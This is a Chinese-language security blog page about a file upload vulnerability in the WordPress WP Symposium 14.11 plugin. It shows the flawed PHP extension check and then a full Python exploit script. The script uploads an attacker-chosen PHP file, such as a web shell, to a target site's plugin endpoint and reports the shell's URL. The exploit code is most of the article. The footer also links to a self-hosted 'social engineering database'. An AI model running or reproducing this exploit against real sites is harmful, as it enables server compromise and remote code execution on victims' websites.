<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>WordPress WP Symposium14.11插件上传漏洞 | 安全天使&#39;Blog</title><meta name="author" content="Angel"><meta name="description" content="WordPress WP Symposium14.11插件上传漏洞以及漏洞利用方法"><meta name="keywords" content="wordpress漏洞利用"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta property="og:title" content="WordPress WP Symposium14.11插件上传漏洞"/><meta property="og:site_name" content="安全天使&#39;Blog"/><meta property="og:image" content="undefined"/><link rel="alternative" href="/atom.xml" title="安全天使&#39;Blog" type="application/atom+xml"><link href="/favicon.jpg" rel="icon"><link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/style.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css"><script type="text/javascript" src="http://lib.sinaapp.com/js/jquery/1.8/jquery.min.js"></script><script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script></head><body id="body" data-spy="scroll" data-target=".toc"><div class="container" id="container">	<div class="content">	<div class="page-header"><h1><a class="brand" href="/">Go Back</a><span class="split"></span><span class="title">WordPress WP Symposium14.11插件上传漏洞</h1></div><span class="date" id="title-date"><strong><i class="fa fa-clock-o"></i>1月 5 2015</strong></span>		<div class="row page">  	<div class="col-xs-12 col-sm-3 col-md-3 toc"> 	<!-- toc -->
<script type="text/javascript">
		jQuery(document).ready(function() {
 		   generateWikiTOC('.note', '.toc',  2 , 2 );
		});
</script></div><div class="col-xs-12 col-sm-9 col-md-9 note">		<h3 id="0"><span class="label label-danger">漏洞标题：WordPress-Symposium14.11插件上传漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：14.11</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h2 id="漏洞产生原因">漏洞产生原因</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">"/wp-symposium/server/file_upload_form.php " </div><div class="line"></div><div class="line">if ($_FILES["file"]["error"] &gt; 0) {</div><div class="line">       echo "Error: " . $_FILES["file"]["error"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">   } else {</div><div class="line">       $allowedExts = ','.get_option(WPS_OPTIONS_PREFIX.'_image_ext').','.get_option(WPS_OPTIONS_PREFIX.'_doc_ext').','.get_option(WPS_OPTIONS_PREFIX.'_video_ext');</div><div class="line">       //echo "Upload: " . $_FILES["file"]["name"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       $ext = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);</div><div class="line">       //echo "Extension: " . $ext . "<span class="tag">&lt;<span class="title">br</span> /&gt;</span>";</div><div class="line">       if (strpos($allowedExts, $ext)) {</div><div class="line">       $extAllowed = true;</div><div class="line">       } else {</div><div class="line">           $extAllowed = false;</div><div class="line">       }</div><div class="line">       //echo "Type: " . $_FILES["file"]["type"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       //echo "Size: " . ($_FILES["file"]["size"] / 1024) . " kB<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       //echo "Stored in: " . $_FILES["file"]["tmp_name"];</div><div class="line"></div><div class="line">       if (!$extAllowed) {</div><div class="line">           echo __('Sorry, file type not allowed.', WPS_TEXT_DOMAIN);</div><div class="line">       } else {</div><div class="line">           // Copy file to tmp location</div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="利用代码python">利用代码python</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line"># Check url</div><div class="line">def checkurl(url):</div><div class="line">    if url[:8] != "https://" and url[:7] != "http://":</div><div class="line">        print('[X] You must insert http:// or https:// procotol')</div><div class="line">        sys.exit(1)</div><div class="line">    else:</div><div class="line">        return url</div><div class="line"></div><div class="line"># Check if file exists and has readable</div><div class="line">def checkfile(file):</div><div class="line">    if not os.path.isfile(file) and not os.access(file, os.R_OK):</div><div class="line">        print '[X] '+file+' file is missing or not readable'</div><div class="line">        sys.exit(1)</div><div class="line">    else:</div><div class="line">        return file</div><div class="line"># Get file's mimetype</div><div class="line">def get_content_type(filename):</div><div class="line">    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'</div><div class="line"></div><div class="line">def id_generator(size=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):</div><div class="line">    return ''.join(random.choice(chars) for _ in range(size))</div><div class="line"></div><div class="line"># Create multipart header</div><div class="line">def create_body_sh3ll_upl04d(payloadname, randDirName, randShellName):</div><div class="line"></div><div class="line">   getfields = dict()</div><div class="line">   getfields['uploader_uid'] = '1'</div><div class="line">   getfields['uploader_dir'] = './'+randDirName</div><div class="line">   getfields['uploader_url'] = url_symposium_upload</div><div class="line"></div><div class="line">   payloadcontent = open(payloadname).read()</div><div class="line"></div><div class="line">   LIMIT = '----------lImIt_of_THE_fIle_eW_$'</div><div class="line">   CRLF = '\r\n'</div><div class="line"></div><div class="line">   L = []</div><div class="line">   for (key, value) in getfields.items():</div><div class="line">      L.append('--' + LIMIT)</div><div class="line">      L.append('Content-Disposition: form-data; name="%s"' % key)</div><div class="line">      L.append('')</div><div class="line">      L.append(value)</div><div class="line"></div><div class="line">   L.append('--' + LIMIT)</div><div class="line">   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', randShellName+".php"))</div><div class="line">   L.append('Content-Type: %s' % get_content_type(payloadname))</div><div class="line">   L.append('')</div><div class="line">   L.append(payloadcontent)</div><div class="line">   L.append('--' + LIMIT + '--')</div><div class="line">   L.append('')</div><div class="line">   body = CRLF.join(L)</div><div class="line">   return body</div><div class="line"></div><div class="line">commandList = optparse.OptionParser('usage: %prog -t URL -f FILENAME.PHP [--timeout sec]')</div><div class="line">commandList.add_option('-t', '--target', action="store",</div><div class="line">                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",</div><div class="line">                  )</div><div class="line">commandList.add_option('-f', '--file', action="store",</div><div class="line">                  help="Insert file name, ex: shell.php",</div><div class="line">                  )</div><div class="line">commandList.add_option('--timeout', action="store", default=10, type="int",</div><div class="line">                  help="[Timeout Value] - Default 10",</div><div class="line">                  )</div><div class="line"></div><div class="line">options, remainder = commandList.parse_args()</div><div class="line"></div><div class="line"># Check args</div><div class="line">if not options.target or not options.file:</div><div class="line">    print(banner)</div><div class="line">    commandList.print_help()</div><div class="line">    sys.exit(1)</div><div class="line"></div><div class="line">payloadname = checkfile(options.file)</div><div class="line">host = checkurl(options.target)</div><div class="line">timeout = options.timeout</div><div class="line"></div><div class="line">print(banner)</div><div class="line"></div><div class="line">socket.setdefaulttimeout(timeout)</div><div class="line"></div><div class="line">url_symposium_upload = host+'/wp-content/plugins/wp-symposium/server/php/'</div><div class="line"></div><div class="line">content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'</div><div class="line"></div><div class="line">randDirName = id_generator()</div><div class="line">randShellName = id_generator()</div><div class="line"></div><div class="line">bodyupload = create_body_sh3ll_upl04d(payloadname, randDirName, randShellName)</div><div class="line"></div><div class="line">headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',</div><div class="line">           'content-type': content_type,</div><div class="line">           'content-length': str(len(bodyupload)) }</div><div class="line"></div><div class="line">try:</div><div class="line">    req = urllib2.Request(url_symposium_upload+'index.php', bodyupload, headers)</div><div class="line">    response = urllib2.urlopen(req)</div><div class="line">    read = response.read()</div><div class="line"></div><div class="line">    if "error" in read or read == "0" or read == "":</div><div class="line">       print("[X] Upload Failed :(")</div><div class="line">    else:</div><div class="line">       print("[!] Shell Uploaded")</div><div class="line">       print("[!] Location: "+url_symposium_upload+randDirName+randShellName+".php\n")</div><div class="line"></div><div class="line">except urllib2.HTTPError as e:</div><div class="line">    print("[X] "+str(e))</div><div class="line">except urllib2.URLError as e:</div><div class="line">    print("[X] Connection Error: "+str(e))</div></pre></td></tr></table></figure>

<div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a><a href="#" class="bds_bdhome" data-cmd="bdhome" title="分享到百度新首页"></a><a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a><a href="#" class="bds_mshare" data-cmd="mshare" title="分享到一键分享"></a><a href="#" class="bds_print" data-cmd="print" title="分享到打印"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>&nbsp;<div class="tucao">❐ 热评文章：<br /><div class="ds-top-threads" data-range="monthly" data-num-items="8"></div><div class="urlid"> &nbsp;&nbsp;[ <a href="" target="_blank">WordPress WP Symposium14.11插件上传漏洞</a> ]由Angel发表在 <a href="/">安全天使</a><br />&nbsp; [ 引用地址 ]：http://www.weshell.net/wordpress-symposium.html</div></div>
<div class="ds-thread" data-title="WordPress WP Symposium14.11插件上传漏洞" data-url="http://www.weshell.net/wordpress-symposium.html"></div><script type="text/javascript">var duoshuoQuery = {short_name:"webshellhost"};(function() {    var ds = document.createElement('script');    ds.type = 'text/javascript';ds.async = true;    ds.src = 'http://static.duoshuo.com/embed.js';    ds.charset = 'UTF-8';    (document.getElementsByTagName('head')[0]    || document.getElementsByTagName('body')[0]).appendChild(ds);})();</script>
	</div></div><div class="container-narrow">	<footer>
<script>var _hmt = _hmt || [];(function() {  var hm = document.createElement("script");  hm.src = "//hm.baidu.com/hm.js?248313087381630ea1a3caba0e789997";  var s = document.getElementsByTagName("script")[0];   s.parentNode.insertBefore(hm, s);})();</script>
<SCRIPT language=javascript>function g(formname)	{var url = "http://www.baidu.com/baidu";if (formname.s[1].checked) {	formname.ct.value = "2097152";}else {	formname.ct.value = "0";}formname.action = url;return true;}</SCRIPT><center><form name="f1" onsubmit="return g(this)" target="_blank"><table bgcolor="#FFFFFF" style="font-size:9pt;"><tr height="60"><td valign="top"></td><td><input name=word size="35" maxlength="100" style="width: 210px;height: 24px;line-height: 24px;font: 14px arial;padding: 2px 5px;margin-right: 3px;border: 2px solid black;outline: 0;vertical-align: middle;margin-top:-27px;"><input type="submit" value="Scan" style="width: 66px;height: 24px;border: 0;color: #ccc;background: black;font-weight: bold;font: bold 14px arial;padding: 0;padding-top: 1px;margin-top:-27px;cursor: pointer;vertical-align: middle;"><br><input name=tn type=hidden value="bds"><input name=cl type=hidden value="3"><input name=ct type=hidden><input name=si type=hidden value="www.weshell.net"><input name=s type=radio style="display:none;"><input name=s type=radio checked style="display:none;"></td></tr></table></form>
<div class="weshell"><font size="0.4em"><strong>[ &copy; 2006-2013 <a href="http://www.weshell.net">安全天使&Angel</a> ] -  [<a href="http://www.miitbeian.gov.cn" target="_blank"> 鄂ICP备105632号-1</a> ] - [<a href="/atom.xml"> RSS源</a> - <a href="/baidusitemap.xml">引擎地图</a> - <a href="https://i0yy.com" target="_blank">自建社工库</a> ]</div>
<script language="javascript" type="text/javascript" src="http://quote.51.la/?id=17600924&amp;mb=3"></script></font></strong></center><div style="display:none"><script language="javascript" type="text/javascript" src="http://js.users.51.la/17600924.js"></script></div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>


</footer></div><a id="gotop" href="#"><span>▲</span></a><script src="/js/jquery.imagesloaded.min.js"></script><script src="/js/gallery.js"></script><script src="http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"></script><script src="/js/jquery.tableofcontents.min.js"></script><script src="/js/tocgenerator.min.js"></script><script src="/js/main.js"></script><link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css"><script src="/fancybox/jquery.fancybox.pack.js"></script><script type="text/javascript">(function($){  $('.fancybox').fancybox();})(jQuery);</script></body></html>